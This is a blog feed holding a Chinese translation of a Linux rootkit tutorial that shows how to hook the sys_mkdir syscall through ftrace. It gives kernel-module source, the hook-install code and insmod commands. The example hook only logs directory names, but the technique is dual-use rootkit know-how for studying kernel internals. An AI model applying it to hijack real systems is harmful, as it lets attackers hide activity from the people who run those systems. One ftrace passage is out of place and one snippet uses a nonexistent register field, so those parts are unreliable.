<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Se8S0n</title>
  
  <subtitle>The more you want, the more you get.</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://Se8S0n.github.io.git/"/>
  <updated>2021-08-22T08:34:50.567Z</updated>
  <id>http://Se8S0n.github.io.git/</id>
  
  <author>
    <name>Se8S0n</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Linux Rookit 教程(2)：Ftrace和Hook函数</title>
    <link href="http://Se8S0n.github.io.git/2021/08/22/Linux-Rookit%E6%95%99%E7%A8%8B2%EF%BC%9AFtrace%E5%92%8CHook%E5%87%BD%E6%95%B0/"/>
    <id>http://Se8S0n.github.io.git/2021/08/22/Linux-Rookit教程2：Ftrace和Hook函数/</id>
    <published>2021-08-22T22:47:18.000Z</published>
    <updated>2021-08-22T08:34:50.567Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1 前言"></a>1 前言</h1><p>本篇文章翻译自<a href="https://xcellerator.github.io/posts/linux_rootkits_02/" target="_blank" rel="noopener">Linux Rootkits Part 2: Ftrace and Function Hooking</a>，由于近段时间有了解Linux Rookit的需要，借这篇翻译文章补一下自己Linux Kernel的基础知识和学习写Linux Kernel shellcode的方法。</p><h1 id="2-正文"><a href="#2-正文" class="headerlink" title="2 正文"></a>2 正文</h1><p>学习完<a href="https://xcellerator.github.io/posts/linux_rootkits_01/" target="_blank" rel="noopener">Linux Rootkits Part 1: Introduction and Workflow</a>之后，你已经会写一个内核模块了。不想止步于此，你可能会想做一点更酷的事，比如篡改运行中内核的执行流程。在这篇文章中，我们介绍的更改Linux内核执行流程的方法就是hook函数，不过问题是，我们怎么知道自己应该hook哪一个函数呢？</p><p>我们很幸运，Linux内核提供了一堆潜在的可Hook的目标函数——syscalls(系统调用函数)！可以在系统调用函数中寻找用于Hook的函数，Syscalls是内核函数，可以在用户态下调用。常见的系统调用函数如下：</p><ul><li>open</li><li>read</li><li>write</li><li>close</li><li>execve</li><li>fork</li><li>kill</li><li>mkdir</li></ul><p>完整的syscalls列表可以在<a href="https://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_64.tbl" target="_blank" rel="noopener">linux源码的syscall_64.tbl</a>看到。内核态中看到这些函数都会加上<code>sys_</code>的前缀的，可以在linux操作系统中用<code>sudo cat /proc/kallsyms | grep function_name</code>获取目标函数地址的偏移量。通过hook syscalls，可以让我们打断类似于<code>sys_read</code>系统调用函数执行的流程，返回与<code>sys_read</code>原本会读取出来不同的数据。或者用<code>sys_execve</code>添加我们自定义的函数变量，甚至可以利用<code>sys_kill</code>系统调用函数中不被用到的信号向rookit中发送下一条指令让其执行特定的操作。</p><p>要完成上述的操作之前，需要我们先了解如何在<strong>用户态</strong>中调用<code>syscalls</code>(系统调用函数), 了解完之后才能知道如何中断系统调用函数的调用过程。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hook-&gt;ops.func = fh_ftrace_thunk;</span><br><span class="line">hook-&gt;ops.flags = FTRACE_OPS_FL_SAVE_REGS</span><br><span class="line">                | FTRACE_OPS_FL_RECURSION_SAFE</span><br><span class="line">                | FTRACE_OPS_FL_IPMODIFY;</span><br></pre></td></tr></table></figure></p><p>如上所述，<code>rip</code>可能已经被修改好了，所以在这里通过设置<code>FTRACE_OPS_FL_IP_MODIFY</code>标志位向ftrace告警。为了设置<code>FTRACE_OPS_FL_IP_MODIFY</code>标志位，我们还需要在hook的过程中给原本系统调用函数中的<code>pt_regs</code>结构体传一个<code>FTRACE_OPS_FL_SAVE_REGS</code>标志位。最后，为了关闭ftrace内置的递归保护机制，就设置了<code>FTRACE_OPS_FL_RECURSION_SAFE</code>标志位。<code>FTRACE_OPS_FL_SAVE_REGS</code>标志位是默认开启的，为了我们的hook能起作用最有效的方式就是关闭ftrace的保护机制。</p><blockquote><p>显而易见，如果ftrace的保护机制利用的是保存在<code>rip</code>寄存器中的返回地址，仅仅告诉ftrace我们要修改<code>rip</code>的值是不够的，ftrace仍旧有不利于我们的保护机制。</p></blockquote><p>除了设置上面的标志位之外，我们还需要给<code>fh_trace_thunk</code>函数中的<code>ops.func</code>子域设置标志位（<code>fh_trace_thunk</code>函数是我们之前讲回调时就提到的函数）。这个函数的功能，是修改<code>rip</code>寄存器中的数值，让其指向<code>hook-&gt;function</code>存的地址。剩下的工作就是要保证不论什么时候<code>rip</code>寄存器保存着<code>sys_mkdir</code>地址的时候，都能回调hook函数。</p><p>这个工作，交给了最后讲解的两个函数。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">err = ftrace_set_filter_ip(&amp;hook-&gt;ops, hook-&gt;address, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(err)</span><br><span class="line">&#123;</span><br><span class="line">    printk(KERN_DEBUG <span class="string">"rootkit: ftrace_set_filter_ip() failed: %d\n"</span>, err);</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = register_ftrace_function(&amp;hook-&gt;ops);</span><br><span class="line"><span class="keyword">if</span>(err)</span><br><span class="line">&#123;</span><br><span class="line">    printk(KERN_DEBUG <span class="string">"rootkit: register_ftrace_function() failed: %d\n"</span>, err);</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><code>ftrace_set_filter_ip()</code>函数，告知ftrace当<code>rip</code>寄存器中保存<code>sys_mkdir</code>系统调用函数的地址的时候，就执行我们写的回调函数(此时我们要hook的<code>sys_mkdir</code>函数的地址已经早早存在了<code>hook-&gt;function</code>中)。最后，设置好这些就达成了调用<code>register_ftrace_function()</code>的目的。到这一步，我们的函数钩子就已经就位了。</p><p>如你所想，一旦unload rookit模块并调用<code>rookit_exit()</code>函数，<code>fh_remove_hooks()</code>函数就会反向完成上面的操作，还原原本的执行流程。</p><p>看到这里你应该就知道，为什么我一开始说不用百分百了解完ftrace使用的原理就能写一个系统调用函数的hook函数。实际上这里面最大的挑战是写hook函数的本身，不过在实际写的过程中还是会遇到很多问题的。</p><h2 id="2-1-Linux在用户态中调用syscalls"><a href="#2-1-Linux在用户态中调用syscalls" class="headerlink" title="2.1 Linux在用户态中调用syscalls"></a>2.1 Linux在用户态中调用<code>syscalls</code></h2><p>在<a href="https://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_64.tbl" target="_blank" rel="noopener">linux源码的syscall_64.tbl</a>中可以看到每一个<code>syscalls</code>前面都对应着一个数字，这个数字实际上是用户在调用系统函数的时候需要传递的系统调用号(syscalls number)。不过这些系统调用号不是固定的，系统调用号在不同版本的架构和内核版本中有可能会不同。</p><p>调用<code>syscalls</code>之前，需要先将系统调用号(<code>syscall number</code>)存储到特定的寄存器中——<code>rax</code>寄存器(x86架构是在eax寄存器中), 之后再利用软件中断<code>syscall</code>调用内核中的函数。所有的<code>syscalls</code>调用之前都需要先将<code>syscalls number</code>存到rax中，大多数函数调用的返回值也会存储在<code>rax</code>中。</p><p><code>syscall 0</code>(<code>sys_read()</code>)是一个很典型的例子，在Linux操作系统中用<code>man 2 read</code>可以找到<code>read</code>函数定义如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> read(<span class="keyword">int</span> fd, <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> count);</span><br></pre></td></tr></table></figure></p><p>根据手册对<code>read</code>函数的描述，<code>fd</code>是文件描述符(调用<code>open()</code>函数返回的值)，<code>buf</code>是一个用于存储读取的数据的缓冲区，<code>count</code>是读取的字节数。如果<code>read</code>函数成功读取的话会返回读取的字节数，读取失败则会返回<code>-1</code>。根据上面的描述，我们可以知道，在调用<code>sys_read</code>函数之前，我们需要传递三个参数。不过，我们怎么知道这三个参数应该放在哪个对应的寄存器中呢？从<a href="https://syscalls64.paolostivanin.com/" target="_blank" rel="noopener">Linux Syscall Reference(64 bit)</a>的表中我们可以查到，<code>sys_read</code>函数在传递参数的过程中会使用到rax、rdi、rsi、rdx寄存器，其存放的对应参数具体如下：</p><table><thead><tr><th style="text-align:center">function_name</th><th style="text-align:center">rax</th><th style="text-align:center">rdi</th><th style="text-align:center">rsi</th><th style="text-align:center">rdx</th></tr></thead><tbody><tr><td style="text-align:center">sys_read</td><td style="text-align:center">0x00</td><td style="text-align:center">unsigned int fd</td><td style="text-align:center">char __user * buf</td><td style="text-align:center">size_t count</td></tr></tbody></table><p><code>rdi</code>寄存器存储文件描述符<code>fd</code>，<code>rsi</code>寄存器存储缓冲区<code>buf</code>，<code>rdx</code>寄存器用于存储字节数<code>count</code>。只要我们往<code>rax</code>寄存器中存入<code>0x00</code>就能调用<code>sys_read</code>函数了。用<code>nasm</code>汇编写的调用<code>sys_read</code>代码大致的样子如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">section .text</span><br><span class="line">mov rax, 0x00</span><br><span class="line">mov rdi, 5</span><br><span class="line">mov rsi, buf</span><br><span class="line">mov rdx, 10</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure></p><p>这段代码从文件描述符<code>5</code>(这个数是随便选的)中读取了10字节的数据存入到<code>buf</code>指向的内存地址中。</p><h2 id="2-2-内核处理syscalls的过程"><a href="#2-2-内核处理syscalls的过程" class="headerlink" title="2.2 内核处理syscalls的过程"></a>2.2 内核处理<code>syscalls</code>的过程</h2><p>上一段结尾写的汇编代码能够在用户态的环境下正常运行，不过内核中是如何处理<code>syscalls</code>的呢？本篇文章介绍的<code>rookit</code>需要运行在内核态中，所以我们接下来应该了解一下内核是如何处理<code>syscalls</code>调用的。接下来介绍的内容，跟上面的会有一些区别。从<code>4.17.0</code>版本的Linux内核开始，内核处理<code>syscalls</code>调用的方式就发生了变化。不过我们在这里还是会先从旧的内核处理<code>syscalls</code>的方式开始介绍，因为<code>Ubuntu 16.04</code>发行版到现在还在使用这种处理方式，而且一旦理解了旧的处理方法，新的处理方法也会更好懂。</p><blockquote><p>由于作者本人的Rootkit应用场景是在CTF中，且应用环境的内核版本低于<code>4.17.0</code>，环境中配置了<code>sudo</code>，因此在操作过程中可以不用密码以root权限运行<code>insmod</code>命令。有点冲突的是，运行的环境是<code>Ubuntu 16.04</code>，而作者写的rookits应用于hook新的<code>syscalls</code>。</p></blockquote><p>从<a href="https://github.com/torvalds/linux/blob/b07175dc41babfec057f494d22a750af755297d8/include/linux/syscalls.h#L468" target="_blank" rel="noopener"><code>syscall.h</code>源码</a>中可以看到<code>sys_read</code>在内核中定义如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">asmlinkage <span class="keyword">long</span> <span class="title">sys_read</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> fd, <span class="keyword">char</span> __user *buf, <span class="keyword">size_t</span> count)</span></span>;</span><br></pre></td></tr></table></figure></p><p>回到2016年，想要准确地给syscalls传递参数，只要按照它地定义方式来就可以了。如果我们想hook <code>sys_read</code>，在把hook放对位置的前提下，只要模仿<code>sys_read</code>函数定义即可，具体参数处理的过程想怎么写都行。</p><p>然而，64位的4.17.0版本的内核中我们不能这样做了。用户存储在寄存器中的参数，会被拷贝到一个特殊的结构体中——<code>pt_regs</code>，只有这个结构体会被传递给<code>syscall</code>。接下来，<code>syscall</code>只负责从结构体中取出它需要的参数。可以从<a href="https://github.com/torvalds/linux/blob/15bc20c6af4ceee97a1f90b43c0e386643c071b4/arch/x86/include/asm/ptrace.h#L12" target="_blank" rel="noopener"><code>ptrace.h</code>的源码中</a>看到，<code>pt_regs</code>结构体的定义如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> bx;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> cx;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> dx;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> si;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> di;</span><br><span class="line">    <span class="comment">/*为了看起来更清晰省略了后面的内容*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这就意味着，我们不能随意地操作<code>sys_read</code>传递地参数了，我们要写的话必须像下面这样写：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">asmlinkage long sys_read(const struct pt_regs * regs)</span><br><span class="line">&#123;</span><br><span class="line">    int fd = regs-&gt;fd;</span><br><span class="line">    char __user *buf = reg-&gt;si;</span><br><span class="line">    size_t count = regs-&gt;dx;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>当然，真实的<code>sys_read</code>函数并不需要这样做，因为内核已经帮我们处理好了这部分工作了。不过，在我们写hook的函数的时候，我们还会需要这样处理这些参数。</p><h2 id="2-3-首次写hook系统调用函数的函数"><a href="#2-3-首次写hook系统调用函数的函数" class="headerlink" title="2.3 首次写hook系统调用函数的函数"></a>2.3 首次写hook系统调用函数的函数</h2><p>带着前面了解的知识，我们接下来一起学习怎么写一个hook功能的函数。在下面的示例中囊括了新旧两版Hook系统函数的方法(Linux Kernel 4.17.0前后写Hook函数的方式不同)，该函数简单地hook了<code>sys_mkdir</code>系统调用函数，并且将<code>sys_mkdir</code>函数创建地目录名称输出到内核缓冲区中。完成上述功能之后，我们需要担忧的就是原本的<code>sys_mkdir</code>的函数的功能没有实现，只有我们写的hook函数起作用了。</p><p>首先，我们需要利用<code>linux/version.h</code>头文件check Linux内核版本，接着只要直接使用一堆预处理宏(preprocessor macros)就行了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/syscalls.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/version.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/namei.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">"GPL"</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">"TheXcellerator"</span>);</span><br><span class="line">MODULE_DESCRIPTION(<span class="string">"mkdir syscall hook"</span>);</span><br><span class="line">MODULE_VERSION(<span class="string">"0.01"</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(CONFIG_X86_64) &amp;&amp; (LINUX_VERSION_CODE &gt;= KERNEL_VERSION(4,17,0))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTREGS_SYSCALL_STUBS 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PTREGS_SYSCALL_STUBS</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> asmlinkage <span class="title">long</span> <span class="params">(*orig_mkdir)</span><span class="params">(<span class="keyword">const</span> struct pt_regs *)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">asmlinkage <span class="keyword">int</span> <span class="title">hook_mkdir</span><span class="params">(<span class="keyword">const</span> struct pt_regs *regs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> __user *pathname = (<span class="keyword">char</span> *)regs-&gt;di;</span><br><span class="line">    <span class="keyword">char</span> dir_name[NAME_MAX] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">long</span> error = strncpy_from_user(dir_name, pathname, NAME_MAX);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (error &gt; <span class="number">0</span>)</span><br><span class="line">        printk(KERN_INFO <span class="string">"rootkit: trying to create directory with name: %s\n"</span>, dir_name);</span><br><span class="line"></span><br><span class="line">    orig_mkdir(regs);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="function"><span class="keyword">static</span> asmlinkage <span class="title">long</span> <span class="params">(*orig_mkdir)</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> __user *pathname, <span class="keyword">umode_t</span> mode)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">asmlinkage <span class="keyword">int</span> <span class="title">hook_mkdir</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> __user *pathname, <span class="keyword">umode_t</span> mode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> dir_name[NAME_MAX] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">long</span> error = strncpy_from_user(dir_name, pathname, NAME_MAX);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (error &gt; <span class="number">0</span>)</span><br><span class="line">        printk(KERN_INFO <span class="string">"rootkit: trying to create directory with name %s\n"</span>, dir_name);</span><br><span class="line"></span><br><span class="line">    orig_mkdir(pathname, mode);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* init and exit functions where the hooking will happen later */</span></span><br></pre></td></tr></table></figure><p>好吧，这堆代码中有很多需要进行解释的地方。直接看代码能发现，代码被if/else分成了两个类似的功能模块。用if判断check完操作系统的内核版本以及架构之后，若满足Linux操作系统是64位的且内核版本大于<code>4.17.0</code>的条件，则定义宏<code>PTREGS_SYSCALL_STUBS</code>并赋值为1，若不满足该条件则不定义。当<code>PTREGS_SYSCALL_STUBS</code>的值为<code>1</code>时(内核版本大于<code>4.17.0</code>的64位Linux操作系统)，代码通过定义<code>orig_mkdir</code>函数指针和<code>hook_mkdir</code>函数声明去操作<code>pt_regs</code>结构体。<code>PTREGS_SYSCALL_STUBS</code>的值不为<code>1</code>时，在hook函数声明时直接使用参数实际名称。需要注意的是，在新版本内核的Hook函数中，必须包含下面的一行代码才能实现从<code>regs</code>结构体中取出<code>pathname</code>参数的值的功能。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">char __user *pathname = (char *)regs-&gt;di;</span><br></pre></td></tr></table></figure></p><p>另一个需要注意的点是，<code>strncpy_from_user</code>函数的使用。<code>pathname</code>参数定义时使用了<code>__user</code>标识符，这意味着<code>pathname</code>参数指向用户空间的位置，不需要映射到我们的地址空间(内核空间)中。当<code>printk()</code>间接引用<code>pathname</code>指针时(取pathname指针的值)，可能会造成段错误或直接打印出垃圾数据，上述两种情况都不是我们想要的。</p><p>为了避免这两种情况，Linux内核给我们提供了一系列的函数，有像<code>copy_from_user()</code>、<code>strncpy_from_user()</code>等从用户空间拷贝数据的函数，还有将数据拷回用户空间的<code>copy_to_user</code>函数。经过上面的简要介绍后，就能知道代码中的<code>strncpy_from_user()</code>函数从用户空间中的<code>pathname</code>拷贝<code>NAME_MAX</code>个字符的数据到<code>dir_name</code>中，<code>NAME_MAX</code>通常为<code>255</code>（该值为Linux文件名的最大长度）或空字节。与简单的旧函数<code>copy_from_user()</code>相比，<code>strncpy_from_user()</code>函数可以识别出空字节。</p><p>一旦我们获取了存储在<code>dir_name</code>缓冲区中新创建的文件夹名称后，代码就会继续运行，并调用<code>printk()</code>函数以常见的字符串<code>%s</code>格式将文件夹名称输出到内核缓冲区中。</p><p>最后，讲解一下两个条件分支中最重要的部分——<code>orig_mkdir()</code>函数的调用。在调用<code>orig_mkdir()</code>函数的时候，传递了与<code>sys_mkdir()</code>函数调用时相对应的参数，这保证了原本<code>sys_mkdir()</code>函数的功能能够正常实现。你可能好奇，<code>orig_mkdir()</code>函数和<code>sys_mkdir()</code>函数是怎么联系起来的，实际上，代码实现时用函数指针原型(function pointer prototype)定义<code>orig_mkdir()</code>就可以让<code>orig_mkdir()</code>函数实现<code>sys_mkdir()</code>的功能了。</p><h2 id="2-4-用Ftrace-Hook函数"><a href="#2-4-用Ftrace-Hook函数" class="headerlink" title="2.4 用Ftrace Hook函数"></a>2.4 用Ftrace Hook函数</h2><p>为了在内核中加上Hook函数，代码中调用了<code>Ftrace</code>函数，具体的<code>Ftrace</code>函数利用过程没必要非常了解，只要知道个大概就行。源码<a href="https://gist.github.com/xcellerator/ac2c039a6bbd7782106218298f5e5ac1#file-ftrace_helper-h" target="_blank" rel="noopener"><code>ftrace_helper.h</code></a>中一开始创建了一个<code>ftrace_hook</code>数组，接着在<code>rootkit_init()</code>中调用<code>fh_install_hooks()</code>，在<code>rootkit_exit()</code>中调用<code>fh_uninstall_hooks()</code>。知道前面这一点，你就能直接进行实操了。任何一个rookit最需要消化的部分是hook它本身，这部分的内容我会在后续的博客中重点介绍。我们所有的需要利用<code>Ftrace()</code>实现的功能已经打包到<code>ftrace_helper.h</code>头文件中了。</p><p>可能有一部分人会因为就学了一丢丢感觉不满意，所以在<code>2.2.5</code>节中对<code>Ftrace()</code>进行了更全面的讲解。如果你没有这样的想法，那就更好了。</p><p>接下来继续讲解如何用<code>Ftrace</code> hook函数，使用之前需要将<code>ftrace_helper.h</code>的文件头包含到我们自己写的module源码中，接着为我们写的module写好init和exit函数。</p><p>不过我们先要做的，还是定义好<code>Ftrace</code>用于处理hook的函数的数组。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">ftrace_hook</span> <span class="title">hook</span>[] = &#123;</span></span><br><span class="line">    HOOK(<span class="string">"sys_mkdir"</span>, hook_mkdir, &amp;orig_mkdir),</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p><code>HOOK</code>宏函数需要传递的参数如下：</p><ul><li><code>.name</code>: hook的系统调用函数的名称或内核函数的名称，我们这里hook的目标函数是<code>sys_mkdir()</code>函数。</li><li><code>.function</code>: 写好的用于hook的<code>hook_mkdir()</code>函数。</li><li><code>.original</code>: 存储在<code>orig_mkdir</code>中原本的系统调用函数的地址。</li></ul><p>要注意的是，<code>hook[]</code>数组能够一次性包含多个hook函数实现复杂的rookit。</p><p>一旦<code>hook[]</code>这个数组设置好后，就可以用<code>fh_install_hooks()</code>给函数安装钩子，用<code>fh_remove_hooks()</code>将钩子卸载掉。具体需要做的就只用将<code>fh_install_hooks()</code>和<code>fh_remove_hooks()</code>分别放到init和exit函数中，并用if检查这两个函数是否成功运行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __<span class="function">init <span class="title">rootkit_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> err;</span><br><span class="line">    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));</span><br><span class="line">    <span class="keyword">if</span>(err)</span><br><span class="line">        <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">    printk(KERN_INFO <span class="string">"rootkit: loaded\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __<span class="function"><span class="built_in">exit</span> <span class="title">rootkit_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));</span><br><span class="line">    printk(KERN_INFO <span class="string">"rootkit: unloaded\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(rootkit_init);</span><br><span class="line">module_exit(rootkit_exit);</span><br></pre></td></tr></table></figure><p>下载好<a href="https://gist.github.com/xcellerator/ac2c039a6bbd7782106218298f5e5ac1" target="_blank" rel="noopener">3个编译所需要的文件</a>，就可以开始编译了。<code>make</code>指令运行完成后，在当前目录下会生成一个<code>rookit.ko</code>文件。用<code>insmod rookit.ko</code>在操作系统内核中加载<code>rookit.ko</code>模块，接着利用<code>mkdir</code>指令创建一个文件夹。拉起hook函数之后，<code>dmesg</code>可以查看到<code>rookit.ko</code>在内核中的输出。具体的命令行的输入如下：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> sudo dmesg -C</span><br><span class="line"><span class="meta">$</span> sudo insmod rootkit.ko</span><br><span class="line"><span class="meta">$</span> mkdir lol</span><br><span class="line"><span class="meta">$</span> dmesg</span><br><span class="line">[ 3271.730008] rootkit: loaded</span><br><span class="line">[ 3276.335671] rootkit: trying to create directory with name: lol</span><br></pre></td></tr></table></figure></p><p>获得了上面的输出之后，说明我们已经成功hook了<code>sys_mkdir</code>系统调用函数。Ftrace已经保证了<code>orig_mkdir</code>会指向原本的<code>sys_mkdir</code>系统调用函数，因此只要在我们的hook函数中直接调用就可以了，不用了解太多的细节。</p><p>考虑到未来rookits通用性，我们需要写一个新的hook函数，让其适用于任意目标函数(想hook的函数)，此外，还需要重写<code>hook[]</code>数组和其他的小细节。</p><blockquote><p>这里指出一点，我们只能hook内核中export出来的函数。<code>/proc/kallsyms</code>可以列出所有内核export出来的函数，不过在用的时候记得在前面加上<code>sudo</code>，不然出现的内存地址会都是<code>0x0</code>。显然，所有的系统调用函数都需要内核export出来，这样用户空间中运行的代码才能去找到它，不过内核中也有我们感兴趣的函数是非系统调用函数的(这些函数也会被内核暴露出来的)，这个我们后续会再进行介绍。</p></blockquote><h2 id="2-5-福利：ftrace-helper-h的细节介绍"><a href="#2-5-福利：ftrace-helper-h的细节介绍" class="headerlink" title="2.5 福利：ftrace_helper.h的细节介绍"></a>2.5 福利：<code>ftrace_helper.h</code>的细节介绍</h2><p>看到这里，就是说你想更了解<code>ftrace</code>在rookit中到底做了些什么。简单来说，rookit利用了<code>Ftrace</code>函数可以attach一个内核的callback函数。(翻译到这里我突然想起今年的BlackHat的<a href="https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Fixing-A-Memory-Forensics-Blind-Spot-Linux-Kernel-Tracing-wp.pdf" target="_blank" rel="noopener">Fixing a Memory Forensics Blind Spot: Linux Kernel Tracing</a>]议题介绍了Linux Kernel 